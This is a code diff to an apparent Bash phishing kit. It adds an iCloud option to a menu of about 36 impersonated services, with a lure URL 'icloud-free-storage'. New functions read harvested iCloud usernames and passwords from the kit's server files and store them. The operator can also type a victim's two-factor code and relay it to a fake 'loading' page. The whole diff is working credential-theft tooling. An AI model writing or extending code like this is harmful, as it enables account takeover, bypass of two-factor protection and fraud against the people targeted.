@@ -433,24 +433,17 @@ capture_ip() {
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
-## Save window objects
-save_window() {
-	IP=$(awk -F'IP: ' '{print $2}' .server/www/window_data.txt | xargs)
-	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saving window objects..."${WHITE}
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/window_data.txt"
-	cat .server/www/window_data.txt >> auth/window_data.txt
-} 
 
 ## Extract code
 extract_code() {
+	echo "" > .server/www/code.txt
+
 	read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the code: " USER_INPUT
 	echo "$USER_INPUT" > .server/www/code.txt
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code entered by user: "
 	echo -e "${RED}[${WHITE}-${RED}]${BLUE} $USER_INPUT"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
 	send_data http://${HOST}:${PORT}/loading.html ${USER_INPUT}
-	echo "" > .server/www/code.txt
 }
 
 ## Send data
@@ -472,7 +465,7 @@ send_data() {
                     break
                     ;;
                 [Nn]*)
-                    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} continue..."
+                    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} [continue]..."
                     break
                     ;;
                 *)
@@ -522,6 +515,46 @@ capture_creds() {
 
 }
 
+extract_icloud_code() {
+	echo "" > .server/www/code.txt
+
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the code (iCloud): " USER_INPUT
+	echo "$USER_INPUT" > .server/www/code.txt
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code entered by user: "
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} $USER_INPUT"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
+	send_data http://${HOST}:${PORT}/loading.html ${USER_INPUT}
+}
+
+capture_icloud_creds() {
+	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames-icloud.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Pass: [^ ]*' .server/www/usernames-icloud.txt | awk '{print $2}')
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames-icloud.dat"
+	cat .server/www/usernames-icloud.txt >> auth/usernames-icloud.dat
+
+	while true; do
+		read -p "${RED}[${WHITE}-${RED}]${BLUE} Generate iCloud Code? (y/n): " choice
+		case $choice in
+			[Yy]*)
+				extract_icloud_code
+				break
+				;;
+			[Nn]*)
+				echo 234 > .server/www/code.txt
+				rm -rf .server/www/code.txt
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} continue..."
+				break
+				;;
+			*)
+				echo -e "\n${RED}[${WHITE}-${RED}]${RED} Invalid choice. Please try again."
+				;;
+		esac
+	done
+}
+
 
 ## Print data
 capture_data() {
@@ -533,16 +566,18 @@ capture_data() {
 			rm -rf .server/www/ip.txt		
 		fi
 		sleep 0.75
-		if [[ -e ".server/www/window_data.txt" ]]; then
-			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Window object present!!"
-			save_window
-			rm -rf .server/www/window_data.txt
-		fi
-		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
 			capture_creds
+
 			rm -rf .server/www/usernames.txt
+		fi
+		sleep 0.75
+		if [[ -e ".server/www/usernames-icloud.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} iCloud Login info Found !!"
+			capture_icloud_creds
+
+			rm -rf .server/www/usernames-icloud.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/resend.txt" ]]; then
@@ -811,6 +846,28 @@ site_gmail() {
 	esac
 }
 
+## iCloud
+site_icloud() {
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} iCloud
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="icloud"
+			mask: 'https://icloud-free-storage'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again ..."
+			{ sleep 1; clear; banner_small; site_icloud; } ;;
+	esac
+}
+
+
 ## Vk
 site_vk() {
 	cat <<- EOF
@@ -854,9 +911,9 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox       ${RED}[${WHITE}36${RED}]${ORANGE} iCloud	
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit	 
 
 	EOF
 	
@@ -995,6 +1052,9 @@ main_menu() {
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
+		36)
+			site_icloud;;
+
 		99)
 			about;;
 		0 | 00 )
